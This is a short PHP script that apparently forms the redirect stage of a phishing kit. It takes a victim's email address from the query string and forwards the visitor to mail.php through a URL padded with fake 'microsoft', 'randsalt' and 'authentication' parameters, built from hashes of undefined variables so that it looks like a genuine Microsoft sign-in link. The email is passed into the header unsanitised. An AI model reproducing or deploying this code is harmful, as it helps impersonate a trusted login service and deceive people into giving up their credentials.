<?php
ob_start();

function now() {
date_default_timezone_set('GMT');
return date("h:i:sa");
}
$url = md5($url);
$praga= password_hash($praga, PASSWORD_BCRYPT, array('cost' => 12));


if(isset($_GET['email'])){
    
$email = $_GET['email'];

}

header("Location: mail.php?contextid&microsoft=$praga&randsalt=$url&email=$email&authentication=$praga");

?>